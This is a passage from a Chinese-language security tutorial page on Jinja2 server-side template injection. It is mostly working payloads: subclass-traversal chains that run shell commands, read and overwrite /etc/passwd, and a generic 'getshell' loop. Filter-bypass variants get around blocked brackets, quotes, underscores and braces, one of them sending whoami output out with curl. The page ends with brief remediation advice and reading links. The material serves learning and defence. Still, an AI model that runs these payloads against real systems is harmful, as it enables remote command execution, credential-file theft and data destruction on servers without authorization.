</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#调用communicate()函数</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">''</span><span class="cm-variable">.__class__.__base__.__subclasses__()[</span><span class="cm-number">128</span><span class="cm-variable">](</span><span class="cm-string">'whoami'</span><span class="cm-variable">,shell</span><span class="cm-operator">=</span><span class="cm-variable">True,stdout</span><span class="cm-operator">=</span><span class="cm-variable">-1).communicate()[</span><span class="cm-number">0</span><span class="cm-variable">].strip()</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#写文件</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">写文件的话就直接把上面的构造里的read()换成write()即可，下面举例利用file类将数据写入文件。</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">""</span><span class="cm-variable">.__class__.__bases__[</span><span class="cm-number">0</span><span class="cm-variable">].__bases__[</span><span class="cm-number">0</span><span class="cm-variable">].__subclasses__()[</span><span class="cm-number">40</span><span class="cm-variable">](</span><span class="cm-string">'/tmp'</span><span class="cm-variable">).write(</span><span class="cm-string">'test'</span><span class="cm-variable">)</span><span class="cm-tag">}}</span>  ----python2的str类型不直接从属于属于基类，所以要两次 .__bases__</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">''</span><span class="cm-variable">.__class__.__mro__[</span><span class="cm-number">2</span><span class="cm-variable">].__subclasses__()[</span><span class="cm-number">59</span><span class="cm-variable">].__init__.__globals__[</span><span class="cm-string">'__builtins__'</span><span class="cm-variable">][</span><span class="cm-string">'file'</span><span class="cm-variable">](</span><span class="cm-string">'/etc/passwd'</span><span class="cm-variable">).write(</span><span class="cm-string">'123456'</span><span class="cm-variable">)</span><span class="cm-tag">}}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#通用 getshell</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">原理就是找到含有 __builtins__ 的类，然后利用。</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{%</span><span class="cm-keyword"> for</span><span class="cm-variable"> c</span><span class="cm-keyword"> in</span><span class="cm-variable"> [].__class__.__base__.__subclasses__() </span><span class="cm-tag">%}{%</span><span class="cm-keyword"> if</span><span class="cm-variable"> c.__name__</span><span class="cm-operator">==</span><span class="cm-string">'catch_warnings'</span><span class="cm-variable"> </span><span class="cm-tag">%}{{</span><span class="cm-variable"> c.__init__.__globals__[</span><span class="cm-string">'__builtins__'</span><span class="cm-variable">].eval(</span><span class="cm-string">"__import__('os').popen('whoami').read()"</span><span class="cm-variable">) </span><span class="cm-tag">}}{%</span><span class="cm-keyword"> endif</span><span class="cm-variable"> </span><span class="cm-tag">%}{%</span><span class="cm-keyword"> endfor</span><span class="cm-variable"> </span><span class="cm-tag">%}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{%</span><span class="cm-keyword"> for</span><span class="cm-variable"> c</span><span class="cm-keyword"> in</span><span class="cm-variable"> [].__class__.__base__.__subclasses__() </span><span class="cm-tag">%}{%</span><span class="cm-keyword"> if</span><span class="cm-variable"> c.__name__</span><span class="cm-operator">==</span><span class="cm-string">'catch_warnings'</span><span class="cm-variable"> </span><span class="cm-tag">%}{{</span><span class="cm-variable"> c.__init__.__globals__[</span><span class="cm-string">'__builtins__'</span><span class="cm-variable">].open(</span><span class="cm-string">'filename'</span><span class="cm-variable">, </span><span class="cm-string">'r'</span><span class="cm-variable">).read() </span><span class="cm-tag">}}{%</span><span class="cm-keyword"> endif</span><span class="cm-variable"> </span><span class="cm-tag">%}{%</span><span class="cm-keyword"> endfor</span><span class="cm-variable"> </span><span class="cm-tag">%}</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 2326px;"></div><div class="CodeMirror-gutters" style="display: none; height: 2326px;"></div></div></div></pre></li></ul><p></br></p><ul><li><p><strong><span>常见绕过方法</span></strong></p><ul><li><p><span>过滤[</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="jinja2"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="jinja2"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">{# getitem、pop #}</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable"> </span><span class="cm-string">''</span><span class="cm-variable">.__class__.__mro__.__getitem__(</span><span class="cm-number">2</span><span class="cm-variable">).__subclasses__().pop(</span><span class="cm-number">40</span><span class="cm-variable">)(</span><span class="cm-string">'/etc/passwd'</span><span class="cm-variable">).read() </span><span class="cm-tag">}}</span></span></pre><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">''</span><span class="cm-variable">.__class__.__mro__.__getitem__(</span><span class="cm-number">2</span><span class="cm-variable">).__subclasses__().pop(</span><span class="cm-number">59</span><span class="cm-variable">).__init__.func_globals.linecache.os.popen(</span><span class="cm-string">'ls'</span><span class="cm-variable">).read() </span><span class="cm-tag">}}</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 115px;"></div><div class="CodeMirror-gutters" style="display: none; height: 115px;"></div></div></div></pre></li><li><p><span>过滤引号</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="jinja2"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="jinja2"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">{# chr函数 #}</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{%</span><span class="cm-variable"> set chr</span><span class="cm-operator">=</span><span class="cm-variable">().__class__.__bases__.__getitem__(</span><span class="cm-number">0</span><span class="cm-variable">).__subclasses__()[</span><span class="cm-number">59</span><span class="cm-variable">].__init__.__globals__.__builtins__.chr </span><span class="cm-tag">%}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable">().__class__.__bases__.__getitem__(</span><span class="cm-number">0</span><span class="cm-variable">).__subclasses__().pop(</span><span class="cm-number">40</span><span class="cm-variable">)(chr(</span><span class="cm-number">47</span><span class="cm-variable">)</span><span class="cm-operator">%</span><span class="cm-number">2</span><span class="cm-variable">bchr(</span><span class="cm-number">101</span><span class="cm-variable">)</span><span class="cm-operator">%</span><span class="cm-number">2</span><span class="cm-variable">bchr(</span><span class="cm-number">116</span><span class="cm-variable">)</span><span class="cm-operator">%</span><span class="cm-number">2</span><span class="cm-variable">bchr(</span><span class="cm-number">99</span><span class="cm-variable">)</span><span class="cm-operator">%</span><span class="cm-number">2</span><span class="cm-variable">bchr(</span><span class="cm-number">47</span><span class="cm-variable">)</span><span class="cm-operator">%</span><span class="cm-number">2</span><span class="cm-variable">bchr(</span><span class="cm-number">112</span><span class="cm-variable">)</span><span class="cm-operator">%</span><span class="cm-number">2</span><span class="cm-variable">bchr(</span><span class="cm-number">97</span><span class="cm-variable">)</span><span class="cm-operator">%</span><span class="cm-number">2</span><span class="cm-variable">bchr(</span><span class="cm-number">115</span><span class="cm-variable">)</span><span class="cm-operator">%</span><span class="cm-number">2</span><span class="cm-variable">bchr(</span><span class="cm-number">115</span><span class="cm-variable">)</span><span class="cm-operator">%</span><span class="cm-number">2</span><span class="cm-variable">bchr(</span><span class="cm-number">119</span><span class="cm-variable">)</span><span class="cm-operator">%</span><span class="cm-number">2</span><span class="cm-variable">bchr(</span><span class="cm-number">100</span><span class="cm-variable">)).read()</span><span class="cm-tag">}}</span>#request对象</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable">().__class__.__bases__.__getitem__(</span><span class="cm-number">0</span><span class="cm-variable">).__subclasses__().pop(</span><span class="cm-number">40</span><span class="cm-variable">)(request.args.path).read() </span><span class="cm-tag">}}</span>&amp;path=/etc/passwd</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">{# 命令执行 #}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{%</span><span class="cm-variable"> set chr</span><span class="cm-operator">=</span><span class="cm-variable">().__class__.__bases__.__getitem__(</span><span class="cm-number">0</span><span class="cm-variable">).__subclasses__()[</span><span class="cm-number">59</span><span class="cm-variable">].__init__.__globals__.__builtins__.chr </span><span class="cm-tag">%}</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable">().__class__.__bases__.__getitem__(</span><span class="cm-number">0</span><span class="cm-variable">).__subclasses__().pop(</span><span class="cm-number">59</span><span class="cm-variable">).__init__.func_globals.linecache.os.popen(chr(</span><span class="cm-number">105</span><span class="cm-variable">)</span><span class="cm-operator">%</span><span class="cm-number">2</span><span class="cm-variable">bchr(</span><span class="cm-number">100</span><span class="cm-variable">)).read() </span><span class="cm-tag">}}</span></span></pre><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-variable">().__class__.__bases__.__getitem__(</span><span class="cm-number">0</span><span class="cm-variable">).__subclasses__().pop(</span><span class="cm-number">59</span><span class="cm-variable">).__init__.func_globals.linecache.os.popen(request.args.cmd).read() </span><span class="cm-tag">}}</span>&amp;cmd=id</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 368px;"></div><div class="CodeMirror-gutters" style="display: none; height: 368px;"></div></div></div></pre></li><li><p><span>过滤下划线</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="jinja2"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="jinja2"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.38281px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{{</span><span class="cm-string">''</span><span class="cm-variable">[request.args.class][request.args.mro][</span><span class="cm-number">2</span><span class="cm-variable">][request.args.subclasses]()[</span><span class="cm-number">40</span><span class="cm-variable">](</span><span class="cm-string">'/etc/passwd'</span><span class="cm-variable">).read() </span><span class="cm-tag">}}</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 46px;"></div><div class="CodeMirror-gutters" style="display: none; height: 46px;"></div></div></div></pre></li><li><p><span>过滤花括号</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="jinja2"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="jinja2"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.51562px; left: 8px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#用<span class="cm-tag">{%%}</span>标记</span></pre></div><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">{%</span><span class="cm-keyword"> if</span><span class="cm-variable"> </span><span class="cm-string">''</span><span class="cm-variable">.__class__.__mro__[</span><span class="cm-number">2</span><span class="cm-variable">].__subclasses__()[</span><span class="cm-number">59</span><span class="cm-variable">].__init__.func_globals.linecache.os.popen(</span><span class="cm-string">'curl http://127.0.0.1:7999/?i=`whoami`'</span><span class="cm-variable">).read()</span><span class="cm-operator">==</span><span class="cm-string">'p'</span><span class="cm-variable"> </span><span class="cm-tag">%}</span>1<span class="cm-tag">{%</span><span class="cm-keyword"> endif</span><span class="cm-variable"> </span><span class="cm-tag">%}</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 92px;"></div><div class="CodeMirror-gutters" style="display: none; height: 92px;"></div></div></div></pre></li><li><p><span>更多绕过思路见</span><strong><span>推荐学习文章</span></strong><span>部分</span></p></li></ul></li></ul><p></br></p><ul><li><p><strong><span>修复建议</span></strong></p><ol><li><p><span>输入验证和过滤：在将用户输入插入模板之前，对其进行验证和过滤。这包括验证输入的类型、长度和格式，并在可能的情况下拒绝不符合预期的输入。</span></p></li><li><p><span>模板沙盒：将用户输入限制在安全的模板构造中，可以通过白名单机制来实现。这意味着只允许使用预定义的、经过验证的模板语法，阻止恶意代码的执行。</span></p></li><li><p><span>限制模板的访问权限：限制模板引擎的访问权限，使其只能访问必要的文件和资源。避免将敏感文件暴露给模板引擎，以防止恶意代码的执行。</span></p></li></ol></li></ul><p></br></p><ul><li><p><strong><span>推荐学习文章</span></strong></p><ol><li><p><a href='https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.web%E6%BC%8F%E6%B4%9E/21.SSTI%E6%B3%A8%E5%85%A5/' target="_blank"><span>d4m1ts-知识库-SSTI注入</span></a></p></li><li><p><a href='https://zhuanlan.zhihu.com/p/618277583' target="_blank"><span>知乎-SSTI之细说jinja2的常用构造及利用思路</span></a></p></li><li><p><a href='https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python' target="_blank"><span>SSTI (Server Side Template Injection)</span></a></p></li><li><p><a href='https://blog.csdn.net/2301_77485708/article/details/132467976' target="_blank"><span>CSDN-【网络安全 | 1.5w字总结】SSTI漏洞入门，这一篇就够了。</span></a></p></li></ol></li></ul></div></div>
</body>
</html>